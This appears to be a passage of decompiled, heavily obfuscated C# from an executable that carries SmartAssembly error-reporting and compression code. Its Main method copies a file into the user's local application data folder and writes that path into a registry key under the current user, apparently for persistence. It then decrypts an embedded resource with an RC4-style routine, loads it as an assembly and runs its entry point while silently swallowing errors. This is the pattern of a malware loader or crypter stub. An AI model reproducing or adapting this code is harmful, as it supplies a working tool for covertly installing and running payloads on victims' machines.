				goto IL_003f;
			case 6:
				num = 8;
				num3 = 1;
				num = 1;
				goto case 1;
			case 7:
				num = 2;
				goto IL_004f;
			case 1:
				num = 3;
				continue;
			case 2:
				num = 4;
				break;
			case 4:
				{
					num = 4;
					break;
				}
				IL_003f:
				num3 = 1;
				num = 1;
				goto case 1;
				IL_004f:
				num3 = 1;
				num = 1;
				goto case 1;
			}
			break;
		}
		return Class25.smethod_253(specialFolder_0, 794, 777);
	}

	static Assembly smethod_60(int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 113:
				num = 1;
				num2 = 6;
				break;
			default:
				num = 2;
				num2 = 0;
				break;
			}
			int num3 = num2;
			num = 9;
			switch (num3)
			{
			default:
				num = 6;
				goto IL_0040;
			case 0:
				num = 0;
				num3 = 4;
				num = 9;
				goto IL_0052;
			case 1:
				num = 6;
				goto IL_0040;
			case 5:
				num = 7;
				goto IL_004d;
			case 7:
				num = 7;
				goto IL_004d;
			case 4:
				goto IL_0052;
			case 2:
				num = 12;
				break;
			case 3:
				num = 12;
				break;
			case 6:
				{
					num = 12;
					break;
				}
				IL_004d:
				num3 = 4;
				num = 9;
				goto IL_0052;
				IL_0040:
				num3 = 4;
				num = 9;
				goto IL_0052;
			}
			break;
			IL_0052:
			num = 4;
		}
		return Class25.smethod_41(678, 648);
	}

	static void smethod_61(object[] object_0, Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class37.string_0 == "1") || !Class25.smethod_172().method_2((SecurityException)exception_0))
		{
			Class25.smethod_54(exception_0, object_0);
			Class25.smethod_172().method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static int smethod_62(Class14.Class16 class16_0)
	{
		return class16_0.int_2;
	}

	static void smethod_63(Class28 class28_0, Enum0 enum0_0, string string_0, string string_1)
	{
		class28_0.delegate1_0?.Invoke(class28_0, new EventArgs3(enum0_0, string_0, string_1));
	}

	static Class14.Class18 smethod_64(Class14.Class19 class19_0)
	{
		byte[] array = new byte[class19_0.int_3];
		Array.Copy(class19_0.byte_1, 0, array, 0, class19_0.int_3);
		return new Class14.Class18(array);
	}

	static void smethod_65(string string_0, Control0 control0_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class25.smethod_171((string_0.Length > 0) ? "error" : "ok");
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static int smethod_66()
	{
		Version version = new Version("6.8.0.121");
		return version.Major;
	}

	static int smethod_67(string string_0, Class29 class29_0)
	{
		try
		{
			bool flag = class29_0.char_0[0] == '\u0001';
			if (string_0 != null && string_0.Length != 0 && (!flag || string_0.Length <= 4) && (flag || string_0[0] == '#'))
			{
				int num = 0;
				int num2 = string_0.Length - 1;
				while (true)
				{
					if (num2 >= 0 && (flag || num2 != 0))
					{
						char c = string_0[num2];
						bool flag2 = false;
						for (int i = 0; i < class29_0.char_0.Length; i++)
						{
							if (class29_0.char_0[i] == c)
							{
								num = num * class29_0.char_0.Length + i;
								flag2 = true;
								break;
							}
						}
						if (!flag2)
						{
							break;
						}
						num2--;
						continue;
					}
					return num;
				}
				return -1;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static void Main(string[] args)
	{
		if (!Class38.smethod_0())
		{
			return;
		}
		Class25.smethod_38();
		int num = 10;
		Class25.smethod_166();
		int num2 = 8;
		num = 17;
		RegistryKey registryKey_ = default(RegistryKey);
		while (true)
		{
			num = 9;
			while (true)
			{
				object[] parameters = new object[0];
				int num3 = Class25.smethod_251(new Random(), 300, 750, 143, 207);
				num = 2;
				while (true)
				{
					num2 = 0;
					num = 17;
					while (true)
					{
						num = 4;
						long num4 = Class25.smethod_49(380, 379);
						_ = Class25.smethod_49(303, 296) - num4;
						num = 6;
						num2 = 9;
						num = 17;
						while (true)
						{
							num = 3;
							while (true)
							{
								int num5;
								if (Class25.smethod_51(Class25.smethod_31(Class25.smethod_59(Environment.SpecialFolder.LocalApplicationData, 308, 367), Class25.smethod_237(1180317595, 6), 111, 5), 1017, 995))
								{
									num = 8;
									num5 = 7;
								}
								else
								{
									num = 7;
									num5 = 1;
								}
								num2 = num5;
								num = 17;
								string string_;
								switch (num2)
								{
								case 6:
									break;
								case 9:
									goto end_IL_006f;
								case 0:
									goto end_IL_00a6;
								case 2:
									goto end_IL_00ab;
								case 3:
									goto IL_00e4;
								default:
									goto end_IL_00e7;
								case 8:
									goto end_IL_00f4;
								case 1:
									num = 16;
									Class25.smethod_8(Class25.smethod_151(111, 86), Class25.smethod_31(Class25.smethod_59(Environment.SpecialFolder.LocalApplicationData, 935, 1020), Class25.smethod_237(1180317593, 4), 907, 993), 972, 953);
									goto IL_0172;
								case 7:
									num = 11;
									goto IL_0172;
								case 5:
									num = 1;
									Class25.smethod_138(registryKey_, Class25.smethod_237(1180317663, 1), (object)Class25.smethod_31(Class25.smethod_59(Environment.SpecialFolder.LocalApplicationData, 742, 701), Class25.smethod_237(1180317596, 1), 9, 99), 554, 517);
									num = 0;
									num2 = 4;
									num = 17;
									goto case 4;
								case 4:
									{
										num = 15;
										Class25.smethod_96(registryKey_, 181, 133);
										try
										{
											int num6 = 1;
											int num7 = 2;
											num6 = 14;
											while (true)
											{
												num6 = 13;
												while (true)
												{
													ResourceManager resourceManager_ = new ResourceManager(Class25.smethod_237(1180317643, 4), Class25.smethod_41(792, 822));
													num6 = 11;
													while (true)
													{
														byte[] byte_ = Class25.smethod_107((byte[])Class25.smethod_134(resourceManager_, Class25.smethod_237(1180317645, 8), 155, 183), Class25.smethod_237(1180317695, 2));
														num6 = 5;
														num7 = 3;
														num6 = 14;
														while (true)
														{
															num6 = 15;
															Class25.smethod_81(resourceManager_, 887, 854);
															Assembly assembly = Class25.smethod_223(byte_, 207, 178);
															num6 = 8;
															int num8;
															if (Class25.smethod_158((MethodBase)Class25.smethod_76(assembly, 976, 956), 166, 214).Length <= 0)
															{
																num6 = 4;
																num8 = 6;
															}
															else
															{
																num6 = 0;
																num8 = 1;
															}
															num7 = num8;
															num6 = 14;
															switch (num7)
															{
															case 3:
																break;
															case 4:
																goto end_IL_0254;
															default:
																goto end_IL_02ad;
															case 0:
																goto IL_02f5;
															case 2:
																goto end_IL_02f9;
															case 1:
																num6 = 12;
																parameters = new object[1] { args };
																num7 = 6;
																num6 = 14;
																goto case 6;
															case 5:
																num6 = 9;
																goto end_IL_0320;
															case 6:
																num6 = 2;
																goto IL_0351;
															case 7:
																{
																	num6 = 2;
																	goto IL_0351;
																}
																IL_0351:
																assembly.EntryPoint!.Invoke(null, parameters);
																num6 = 9;
																goto end_IL_0320;
															}
															continue;
															end_IL_0254:
															break;
														}
														num6 = 11;
														continue;
														end_IL_02ad:
														break;
													}
													num6 = 13;
													continue;
													IL_02f5:
													num6 = 13;
													continue;
													end_IL_02f9:
													break;
												}
												continue;
												end_IL_0320:
												break;
											}
										}
										catch
										{
										}
										int num9 = 2;
										int num10 = 0;
										return;
									}
									IL_0172:
									string_ = Class25.smethod_104(Class25.smethod_237(1180317580, 2));
									registryKey_ = Class25.smethod_16(Registry.CurrentUser, string_, bool_0: true, 334, 349);
									num = 14;
									num2 = 5;
									num = 17;
									goto case 5;
								}
								num = 3;
								continue;
								end_IL_006f:
								break;
							}
							continue;
							end_IL_00a6:
							break;
						}
						continue;
						end_IL_00ab:
						break;
					}
					num = 2;
					continue;
					IL_00e4:
					num = 2;
					continue;
					end_IL_00e7:
					break;
				}
				num = 9;
				continue;
				end_IL_00f4:
				break;
			}
		}
	}

	static Assembly smethod_68()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_69(MemoryStream memoryStream_0, int int_0, int int_1)
	{
		int num = 11;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 5:
				num = 10;
				num2 = 7;
				break;
			default:
				num = 8;
				num2 = 0;
				break;
			}
			int num3 = num2;
			num = 6;
			switch (num3)
			{
			default:
				num = 2;
				goto IL_004c;
			case 0:
				num = 3;
				goto IL_0044;
			case 2:
				num = 7;
				num3 = 1;
				num = 6;
				goto IL_0050;
			case 3:
				num = 3;
				goto IL_0044;
			case 4:
				num = 2;
				goto IL_004c;
			case 1:
				goto IL_0050;
			case 5:
				num = 12;
				break;
			case 6:
				num = 12;
				break;
			case 7:
				{
					num = 12;
					break;
				}
				IL_0044:
				num3 = 1;
				num = 6;
				goto IL_0050;
				IL_004c:
				num3 = 1;
				num = 6;
				goto IL_0050;
			}
			break;
			IL_0050:
			num = 11;
		}
		return Class25.smethod_176(memoryStream_0, 320, 259);
	}

	static void smethod_70(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class25.smethod_54(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_71(Class14.Class21.Class22 class22_0)
	{
		int[] array = new int[class22_0.int_3];
		int num = 0;
		class22_0.short_1 = new short[class22_0.short_0.Length];
		for (int i = 0; i < class22_0.int_3; i++)
		{
			array[i] = num;
			num += class22_0.int_2[i] << 15 - i;
		}
		for (int j = 0; j < class22_0.int_1; j++)
		{
			int num2 = class22_0.byte_0[j];
			if (num2 > 0)
			{
				class22_0.short_1[j] = Class25.smethod_10(array[num2 - 1]);
				array[num2 - 1] += 1 << 16 - num2;
			}
		}
	}

	static void smethod_72(Delegate0 delegate0_0, Class29 class29_0)
	{
		Delegate0 @delegate = class29_0.delegate0_0;
		Delegate0 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate0 value = (Delegate0)Delegate.Combine(delegate2, delegate0_0);
			@delegate = Interlocked.CompareExchange(ref class29_0.delegate0_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static string smethod_73(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.string_0;
	}

	static void smethod_74(EventHandler eventHandler_0, Class29 class29_0)
	{
		EventHandler eventHandler = class29_0.eventHandler_0;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, eventHandler_0);
			eventHandler = Interlocked.CompareExchange(ref class29_0.eventHandler_0, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	static byte[] smethod_75(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class27.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class27.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class27.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static MethodInfo smethod_76(Assembly assembly_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 108:
				return assembly_0.EntryPoint;
			}
			int num = 0;
		}
	}

	static bool smethod_77(Class33 class33_0)
	{
		return class33_0.bool_0;
	}

	static void smethod_78(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		int num = 1;
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 60:
				stream_0.Write(byte_0, int_0, int_1);
				return;
			}
			num = 1;
		}
	}

	static bool smethod_79(int int_0, Class14.Class23 class23_0)
	{
		int num = 128;
		int num2 = 128;
		short[] short_ = class23_0.short_1;
		int int_ = class23_0.int_4;
		int num3 = class23_0.int_4 + class23_0.int_2;
		int num4 = Math.Max(class23_0.int_2, 2);
		int num5 = Math.Max(class23_0.int_4 - 32506, 0);
		int num6 = class23_0.int_4 + 258 - 1;
		byte b = class23_0.byte_0[num3 - 1];
		byte b2 = class23_0.byte_0[num3];
		if (num4 >= 8)
		{
			num >>= 2;
		}
		if (num2 > class23_0.int_5)
		{
			num2 = class23_0.int_5;
		}
		do
		{
			if (class23_0.byte_0[int_0 + num4] != b2 || class23_0.byte_0[int_0 + num4 - 1] != b || class23_0.byte_0[int_0] != class23_0.byte_0[int_] || class23_0.byte_0[int_0 + 1] != class23_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num7 = int_0 + 2;
			int_ += 2;
			while (class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && class23_0.byte_0[++int_] == class23_0.byte_0[++num7] && int_ < num6)
			{
			}
			if (int_ > num3)
			{
				class23_0.int_1 = int_0;
				num3 = int_;
				num4 = int_ - class23_0.int_4;
				if (num4 >= num2)
				{
					break;
				}
				b = class23_0.byte_0[num3 - 1];
				b2 = class23_0.byte_0[num3];
			}
			int_ = class23_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > num5 && --num != 0);
		class23_0.int_2 = Math.Min(num4, class23_0.int_5);
		return class23_0.int_2 >= 3;
	}

	static int smethod_80(int int_0, Class14.Class17 class17_0, byte[] byte_0, int int_1)
	{
		int num = class17_0.int_0;
		if (int_1 > class17_0.int_1)
		{
			int_1 = class17_0.int_1;
		}
		else
		{
			num = (class17_0.int_0 - class17_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class17_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class17_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class17_0.int_1 -= num2;
		if (class17_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static void smethod_81(ResourceManager resourceManager_0, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 33:
				resourceManager_0.ReleaseAllResources();
				return;
			}
			num = 0;
		}
	}

	static void smethod_82(byte[] byte_0, Class14.Class18 class18_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				array[num]++;
			}
		}
		int num2 = 0;
		int num3 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num2;
			num2 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num4 = array2[j] & 0x1FF80;
				int num5 = num2 & 0x1FF80;
				num3 += num5 - num4 >> 16 - j;
			}
		}
		class18_0.short_0 = new short[num3];
		int num6 = 512;
		for (int num7 = 15; num7 >= 10; num7--)
		{
			int num8 = num2 & 0x1FF80;
			num2 -= array[num7] << 16 - num7;
			int num9 = num2 & 0x1FF80;
			for (int k = num9; k < num8; k += 128)
			{
				class18_0.short_0[Class25.smethod_10(k)] = (short)((-num6 << 4) | num7);
				num6 += 1 << num7 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num10 = byte_0[l];
			if (num10 == 0)
			{
				continue;
			}
			num2 = array2[num10];
			int num11 = Class25.smethod_10(num2);
			if (num10 <= 9)
			{
				do
				{
					class18_0.short_0[num11] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < 512);
			}
			else
			{
				int num12 = class18_0.short_0[num11 & 0x1FF];
				int num13 = 1 << (num12 & 0xF);
				num12 = -(num12 >> 4);
				do
				{
					class18_0.short_0[num12 | (num11 >> 9)] = (short)((l << 4) | num10);
					num11 += 1 << num10;
				}
				while (num11 < num13);
			}
			array2[num10] = num2 + (1 << 16 - num10);
		}
	}

	static string smethod_83(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.string_0;
	}

	static void smethod_84(RegistryKey registryKey_0, string string_0, object object_0, int int_0, int int_1)
	{
		int num = 4;
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 107:
				registryKey_0.SetValue(string_0, object_0);
				return;
			}
			num = 4;
		}
	}

	static void smethod_85(Class14.Class17 class17_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class17_0.byte_0[class17_0.int_0++] = class17_0.byte_0[int_0++];
			class17_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static Icon smethod_86()
	{
		try
		{
			return Class25.smethod_100();
		}
		catch (Exception)
		{
			return Class25.smethod_127("default");
		}
	}

	static void smethod_87(Class14.Class23 class23_0)
	{
		if (class23_0.int_4 >= 65274)
		{
			Class25.smethod_95(class23_0);
		}
		while (class23_0.int_5 < 262 && class23_0.int_7 < class23_0.int_8)
		{
			int num = 65536 - class23_0.int_5 - class23_0.int_4;
			if (num > class23_0.int_8 - class23_0.int_7)
			{
				num = class23_0.int_8 - class23_0.int_7;
			}
			Array.Copy(class23_0.byte_1, class23_0.int_7, class23_0.byte_0, class23_0.int_4 + class23_0.int_5, num);
			class23_0.int_7 += num;
			class23_0.int_6 += num;
			class23_0.int_5 += num;
		}
		if (class23_0.int_5 >= 3)
		{
			Class25.smethod_219(class23_0);
		}
	}

	static void smethod_88(Class14.Class24 class24_0)
	{
		if (class24_0.int_2 > 0)
		{
			class24_0.byte_0[class24_0.int_1++] = (byte)class24_0.uint_0;
			if (class24_0.int_2 > 8)
			{
				class24_0.byte_0[class24_0.int_1++] = (byte)(class24_0.uint_0 >> 8);
			}
		}
		class24_0.uint_0 = 0u;
		class24_0.int_2 = 0;
	}

	static string smethod_89(Class28.Class32 class32_0)
	{
		return class32_0.string_1;
	}

	static bool smethod_90(EventArgs1 eventArgs1_0, string string_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class25.smethod_129(eventArgs1_0.class29_0, string_0);
	}

	static string smethod_91()
	{
		return "SmartAssembly";
	}

	static int smethod_92(int int_0, Class14.Class21 class21_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static string smethod_93(object object_0, object object_1, int int_0, int int_1)
	{
		int num = 0;
		while (true)
		{
			int num2;
			switch (int_1 ^ int_0)
			{
			case 34:
				num = 9;
				num2 = 0;
				break;
			default:
				num = 10;
				num2 = 7;
				break;
			}
			int num3 = num2;
			num = 12;
			switch (num3)
			{
			default:
				num = 4;
				goto IL_0045;
			case 1:
				num = 4;
				goto IL_0045;
			case 4:
				num = 8;
				num3 = 2;
				num = 12;
				goto IL_0059;
			case 5:
				num = 4;
				goto IL_0045;
			case 6:
				num = 11;
				goto IL_0054;
			case 7:
				num = 11;
				goto IL_0054;
			case 2:
				goto IL_0059;
			case 0:
				num = 2;
				break;
			case 3:
				{
					num = 2;
					break;
				}
				IL_0054:
				num3 = 2;
				num = 12;
				goto IL_0059;
				IL_0045:
				num3 = 2;
				num = 12;
				goto IL_0059;
			}
			break;
			IL_0059:
			num = 0;
		}
		return Class25.smethod_162(object_0, object_1, 631, 531);
	}

	static int smethod_94(Stream stream_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 106:
				return stream_0.ReadByte();
			}
		}
	}

	static void smethod_95(Class14.Class23 class23_0)
	{
		Array.Copy(class23_0.byte_0, 32768, class23_0.byte_0, 0, 32768);
		class23_0.int_1 -= 32768;
		class23_0.int_4 -= 32768;
		class23_0.int_3 -= 32768;
		for (int i = 0; i < 32768; i++)
		{
			int num = class23_0.short_0[i] & 0xFFFF;
			class23_0.short_0[i] = (short)((num >= 32768) ? (num - 32768) : 0);
		}
		for (int j = 0; j < 32768; j++)
		{
			int num2 = class23_0.short_1[j] & 0xFFFF;
			class23_0.short_1[j] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
		}
	}

	static void smethod_96(RegistryKey registryKey_0, int int_0, int int_1)
	{
		int num = 4;
		int num2 = 4;
		num = 6;
		while (true)
		{
			num = 3;
			while (true)
			{
				int num3;
				switch (int_1 ^ int_0)
				{
				case 48:
					num = 1;
					num3 = 5;
					break;
				default:
					num = 8;
					num3 = 0;
					break;
				}
				num2 = num3;
				num = 6;
				switch (num2)
				{
				default:
					num = 3;
					continue;
				case 1:
					num = 3;
					continue;
				case 0:
					num = 5;
					num2 = 4;
					num = 6;
					break;
				case 4:
					break;
				case 2:
					num = 0;
					goto IL_005e;
				case 3:
					num = 0;
					goto IL_005e;
				case 5:
					{
						num = 0;
						goto IL_005e;
					}
					IL_005e:
					Class25.smethod_19(registryKey_0, 696, 722);
					return;
				}
				break;
			}
		}
	}

	static void smethod_97(byte[] byte_0, int int_0, int int_1, Class14.Class24 class24_0)
	{
		Array.Copy(byte_0, int_0, class24_0.byte_0, class24_0.int_1, int_1);
		class24_0.int_1 += int_1;
	}

	static void smethod_98(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static int smethod_99(byte[] byte_0, Class14.Class20 class20_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int num3 = num2;
		while (true)
		{
			int num4 = Class25.smethod_242(class20_0.class24_0, byte_0, num, num2);
			num += num4;
			class20_0.long_0 += num4;
			num2 -= num4;
			if (num2 == 0 || class20_0.int_0 == 30)
			{
				break;
			}
			Class14.Class23 class23_ = class20_0.class23_0;
			bool bool_ = (class20_0.int_0 & 4) != 0;
			bool bool_2 = (class20_0.int_0 & 8) != 0;
			if (Class25.smethod_173(bool_, class23_, bool_2))
			{
				continue;
			}
			if (class20_0.int_0 != 16)
			{
				if (class20_0.int_0 == 20)
				{
					for (int num5 = 8 + (-Class25.smethod_135(class20_0.class24_0) & 7); num5 > 0; num5 -= 10)
					{
						Class25.smethod_30(class20_0.class24_0, 2, 10);
					}
					class20_0.int_0 = 16;
				}
				else if (class20_0.int_0 == 28)
				{
					Class25.smethod_88(class20_0.class24_0);
					class20_0.int_0 = 30;
				}
				continue;
			}
			return num3 - num2;
		}
		return num3 - num2;
	}

	static Icon smethod_100()
	{
		int int_ = 0;
		int int_2 = 0;
		int num = Class25.ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
		if (num > 0)
		{
			Class25.ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
			if (int_ != 0)
			{
				return Icon.FromHandle(new IntPtr(int_));
			}
		}
		return null;
	}

	static bool smethod_101(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static string smethod_102(ResolveEventArgs resolveEventArgs_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 99:
				return resolveEventArgs_0.Name;
			}
			int num = 5;
		}
	}

	static Stream smethod_103(string string_0, int int_0, Assembly assembly_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 83:
				return assembly_0.GetManifestResourceStream(string_0);
			}
		}
	}

	static string smethod_104(string string_0)
	{
		int num = 7;
		char[] array = Class25.smethod_27(string_0, 568, 555);
		num = 8;
		Class25.smethod_136((Array)array, 378, 261);
		int num2 = 3;
		num = 2;
		return new string(array);
	}

	static AppDomain smethod_105(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 79:
				return AppDomain.CurrentDomain;
			}
		}
	}

	[DllImport("kernel32.dll")]
	static extern void GetSystemInfo(ref Class40.Struct13 struct13_0);

	static string smethod_106()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class25.smethod_37();
	}

	static byte[] smethod_107(byte[] byte_0, string string_0)
	{
		int num = 29;
		int num5 = default(int);
		byte b = default(byte);
		int num6 = default(int);
		int num7 = default(int);
		while (true)
		{
			byte[] array = Class25.smethod_182(Class25.smethod_47(414, 500), string_0, 432, 385);
			int num2 = 12;
			num = 10;
			while (true)
			{
				num = 21;
				byte[] array2 = new byte[256];
				byte[] array3 = new byte[256];
				num = 13;
				while (true)
				{
					int num3 = 0;
					num2 = 10;
					num = 10;
					while (true)
					{
						num = 0;
						int num4;
						if (num3 < 256)
						{
							num = 18;
							num4 = 20;
						}
						else
						{
							num = 35;
							num4 = 16;
						}
						num2 = num4;
						num = 10;
						while (true)
						{
							switch (num2)
							{
							case 18:
								num = 33;
								num5 = (num5 + array2[num3] + array3[num3]) % 256;
								num = 27;
								goto IL_0036;
							case 14:
								num = 4;
								b = array2[num3];
								array2[num3] = array2[num5];
								num = 32;
								num2 = 7;
								num = 10;
								goto case 7;
							case 7:
								num = 8;
								array2[num5] = b;
								num3++;
								num2 = 8;
								num = 10;
								goto case 8;
							case 8:
							{
								num = 7;
								int num9;
								if (num3 >= 256)
								{
									num = 3;
									num9 = 5;
								}
								else
								{
									num = 9;
									num9 = 18;
								}
								num2 = num9;
								num = 10;
								continue;
							}
							case 17:
								num = 1;
								byte_0[num6] ^= array2[num7];
								num = 6;
								num2 = 4;
								num = 10;
								goto case 4;
							case 4:
								num = 26;
								num6++;
								num2 = 2;
								num = 10;
								goto case 2;
							case 2:
							{
								num = 2;
								int num8;
								if (num6 >= Class25.smethod_201((Array)byte_0, 0, 580, 575))
								{
									num = 23;
									num8 = 19;
								}
								else
								{
									num = 25;
									num8 = 13;
								}
								num2 = num8;
								num = 10;
								continue;
							}
							case 16:
								num = 15;
								num5 = 0;
								num3 = 0;
								num2 = 8;
								num = 10;
								goto case 8;
							case 15:
								num = 30;
								b = array2[num3];
								array2[num3] = array2[num5];
								num = 34;
								num2 = 1;
								num = 10;
								goto case 1;
							case 1:
								num = 38;
								array2[num5] = b;
								num7 = (array2[num3] + array2[num5]) % 256;
								num = 16;
								goto IL_0149;
							case 13:
								num = 17;
								num3 = (num3 + 1) % 256;
								num5 = (num5 + array2[num3]) % 256;
								num = 5;
								num2 = 15;
								num = 10;
								goto case 15;
							case 6:
								num = 27;
								goto IL_0036;
							case 5:
								num = 37;
								num5 = 0;
								num3 = 0;
								num6 = 0;
								num2 = 2;
								num = 10;
								goto case 2;
							case 3:
								num = 16;
								goto IL_0149;
							case 20:
								num = 22;
								array2[num3] = (byte)num3;
								array3[num3] = array[num3 % Class25.smethod_1((Array)array, 0, 241, 167)];
								num = 24;
								num2 = 11;
								num = 10;
								goto case 11;
							case 11:
								num = 31;
								num3++;
								num2 = 10;
								num = 10;
								break;
							case 10:
								break;
							case 9:
								goto end_IL_025e;
							case 12:
								goto end_IL_0273;
							default:
								num = 20;
								goto IL_02aa;
							case 21:
								num = 20;
								goto IL_02aa;
							case 0:
								num = 29;
								goto end_IL_0280;
							case 19:
								{
									num = 28;
									return byte_0;
								}
								IL_02aa:
								num2 = 0;
								num = 10;
								goto case 0;
								IL_0149:
								num2 = 17;
								num = 10;
								goto case 17;
								IL_0036:
								num2 = 14;
								num = 10;
								goto case 14;
							}
							break;
						}
						continue;
						end_IL_025e:
						break;
					}
					num = 13;
					continue;
					end_IL_0273:
					break;
				}
				continue;
				end_IL_0280:
				break;
			}
		}
	}

	static bool smethod_108(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_0;
	}

	static bool smethod_109(Class28.Class32 class32_0, Class28 class28_0, byte[] byte_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class25.smethod_180(byte_0);
		}
		catch (Exception)
		{
			Class25.smethod_128(class28_0, Enum0.const_0, Class14.string_0);
